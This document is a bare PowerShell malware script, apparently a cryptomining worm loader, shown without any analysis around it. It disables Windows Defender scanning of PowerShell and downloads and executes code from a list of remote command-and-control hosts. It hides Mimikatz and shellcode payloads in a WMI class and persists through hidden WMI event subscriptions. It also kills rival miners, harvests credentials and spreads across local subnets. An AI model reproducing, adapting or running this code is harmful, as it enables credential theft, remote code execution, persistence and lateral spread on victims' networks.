
$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*")
{

	$a = Get-MpPreference
	$b=$a.ExclusionProcess
	if (($b -ne $null) -and ($b.contains("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))){
		"already list"
	}else{
		"add list"
		Add-MpPreference -ExclusionProcess "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	}

}

$se=@('sjjjv.xyz:8000','profetestruec.net:8000','winupdate.firewall-gateway.de:8000','45.140.88.145:8000','205.209.152.78:8000')
$ses=@('sjjjv.xyz','profetestruec.net','winupdate.firewall-gateway.de','45.140.88.145','205.209.152.78')
$nic=$null
foreach($t in $se)
{
	$ban=((New-Object Net.WebClient).DownloadString("http://$t/banner"))
	if ($ban -ne $null)
	{
		$nic='http://'+$t
		break
	}
}
if ($ban -eq $null)
{	
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
	[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12
	foreach($t in $ses)
	{
		$ban=((New-Object Net.WebClient).DownloadString("https://$t/banner"))
		if ($ban -ne $null)
		{
			$nic='https://'+$t
			$nic
			break
		}
	}

}




if ((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64'))
{
	IEX(New-Object Net.WebClient).DownloadString("$nic/in6.ps1")
	return
}

function decom ($src)
{
	$data = [System.Convert]::FromBase64String($src)
	$ms = New-Object System.IO.MemoryStream
	$ms.Write($data, 0, $data.Length)
	$ms.Seek(0,0) | Out-Null
	$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
	$t = $sr.readtoend()
	return $t
}
function reload ($f){
$a=decom $f
$b=""
$size=[Math]::Floor($a.length/1000)
for($i=$size-1;$i -ge 0;$i--)
{ 
    $b+=$a.Substring($i*1000,1000)
} 
$b+=$a.Substring($size*1000)
return $b
}
$fa=reload $fa




$mimi=$fa.Substring(0,1400152)
$funs=$fa.Substring(1400154,600960)

$sc=$fa.Substring(2001116)

$StaticClass = New-Object Management.ManagementClass('root\default', $null,$null)
$StaticClass.Name = 'systemcore_Updater8'
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('mimi' , $mimi)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('funs' , $funs)
$StaticClass.Put() | out-null
$StaticClass.Properties.Add('sc' , $sc)
$StaticClass.Put() | out-null



$filterName = 'SCM Event8 Log Filter'
$consumerName = 'SCM Event8 Log Consumer'
$filterName2 = 'SCM Event8 Log Filter2'

$consumerName2 = 'SCM Event8 Log Consumer2'
$Script=@'

$opsys=Get-WmiObject Win32_OperatingSystem 
if ($opsys.version -like "10.*")
{

	$a = Get-MpPreference
	$b=$a.ExclusionProcess
	if (($b -ne $null) -and ($b.contains("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))){
		"already list"
	}else{
		"add list"
		Add-MpPreference -ExclusionProcess "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	}

}


$se=@('sjjjv.xyz:8000','profetestruec.net:8000','winupdate.firewall-gateway.de:8000','45.140.88.145:8000','205.209.152.78:8000')
$ses=@('sjjjv.xyz','profetestruec.net','winupdate.firewall-gateway.de','45.140.88.145','205.209.152.78')
$nic=$null
foreach($t in $se)
{
	$ban=((New-Object Net.WebClient).DownloadString("http://$t/banner"))
	if ($ban -ne $null)
	{
		$nic='http://'+$t
		break
	}
}
if ($ban -eq $null)
{	
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
	foreach($t in $ses)
	{
		$ban=((New-Object Net.WebClient).DownloadString("https://$t/banner"))
		if ($ban -ne $null)
		{
			$nic='https://'+$t
			break
		}
	}

}

$nic



$a=([string](Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding ))
if ($a -eq $null){
	IEX(New-Object Net.WebClient).DownloadString("$nic/in6.ps1")
}else{
	if (($ban -ne $null) -and (!$a.contains($ban)))
	{
		if ((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64'))
		{
			IEX(New-Object Net.WebClient).DownloadString("$nic/in6.ps1")

		}else{
			IEX(New-Object Net.WebClient).DownloadString("$nic/in3.ps1")
		}
		return
	}
}




sleep(10)
						



$stime=[Environment]::TickCount
$funs = ([WmiClass] 'root\default:systemcore_Updater8').Properties['funs'].Value        
$defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
iex $defun

Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -notmatch 'SCM Event8 Log'} |Remove-WmiObject


$exist=$False
[array]$psids= get-process  |sort cpu -Descending
$pname=$psids[0].processname
$psid=$psids[0].id
$tcpconn = netstat -anop tcp
if (($pname -eq 'powershell') -or ($pname -eq 'schtasks'))
{
	 
	if ($psids -ne $null )
	{
		foreach ($t in $tcpconn)
		{
			$line =$t.split(' ')| ?{$_}
			if ($line -eq $null)
			{continue}
			if (($psid -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444") ) )
			{
				$exist=$true
				break
			}
		}
	}
}

foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
		if (($line -eq $null) -or ($line.count -le 3)){continue}
        if (($line[-3].contains(":3333") -or $line[-3].contains(":5555")-or $line[-3].contains(":7777")) -and $t.contains("ESTABLISHED"))
        {
            $evid=$line[-1]
            Get-Process -id $evid | stop-process -force
        }
    }
	
	


$psproc= get-process -name powershell
if ($psproc.length -le 4)
{	
		
	$NTLM=$False
	$mimi = ([WmiClass] 'root\default:systemcore_Updater8').Properties['mimi'].Value 
	$a, $NTLM= Get-creds $mimi $mimi
	$a	   
	$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}    
	$scba= ([WmiClass] 'root\default:systemcore_Updater8').Properties['sc'].Value
	  
	$sc=[system.convert]::FromBase64String($scba)
	foreach ($Network in $Networks) 
	{            
		
		$IPAddress  = $Network.IpAddress[0]  
		if ($IPAddress -match '^169.254'){continue} 	
		$SubnetMask  = $Network.IPSubnet[0] 
		if (($IPAddress -match '^172.') -or ($IPAddress -match '^192.168') ){$SubnetMask='255.255.0.0'} 	
		$ips=Get-NetworkRange $IPAddress $SubnetMask
		$tcpconn = netstat -anop tcp 
		foreach ($t in $tcpconn)
		{
			$line =$t.split(' ')| ?{$_}
			if (!($line -is [array])){continue}
			if ($line.count -le 4){continue}
			$i=$line[-3].split(':')[0]
			if ( ($i -ne '127.0.0.1') -and ($ips -notcontains $i))
			{
				$ips+=$i
			}
		}
		$ips = Get-Random -InputObject $ips -Count ($ips.Count)
		test-net -computername $ips -creds $a -filter_name "SCM Event8 Log" -ntlm $NTLM -nic $nic -sc $sc -Throttle 10	
	 }       
}

'@
$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)
$EncodedScript=[System.Convert]::ToBase64String($Scriptbytes)

$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 13600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Query2= "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 301"


Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SCM Event8 Log Consumer%'" | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -filter "name like '%SCM Event8 Log Filter%'" |Remove-WmiObject 
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name like '%SCM Event8 Log Consumer%'" | Remove-WmiObject


$FilterParams = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'     
        Arguments =@{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventFilter = Set-WmiInstance @FilterParams

$ConsumerParams = @{
        Namespace = 'root\subscription'
        Class = 'CommandLineEventConsumer'
        Arguments =@{ Name = $consumerName; CommandLineTemplate="powershell.exe -NoP -NonI -W Hidden  -E $EncodedScript"}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventConsumer = Set-WmiInstance @ConsumerParams 

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | out-null

$FilterParams2 = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'     
        Arguments =@{Name=$filterName2;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query2}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventFilter2 = Set-WmiInstance @FilterParams2

$ConsumerParams2 = @{
        Namespace = 'root\subscription'
        Class = 'CommandLineEventConsumer'
        Arguments =@{ Name = $consumerName2; CommandLineTemplate="powershell.exe -NoP -NonI -W Hidden  -E $EncodedScript"}
        ErrorAction = 'SilentlyContinue'
    }
$WMIEventConsumer2 = Set-WmiInstance @ConsumerParams2

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter2;Consumer=$WMIEventConsumer2} | out-null







powercfg /CHANGE -standby-timeout-ac 0 
powercfg /CHANGE -hibernate-timeout-ac 0 
Powercfg -SetAcValueIndex 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 000

[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
$tcpconn = netstat -anop tcp 
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
		if (($psids -contains $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444") -or $t.contains(":14433") -or $t.contains(":443")) )
        {
			Get-Process -id $psids[0] | stop-process -force
            break
        }
    }
}

iex $script

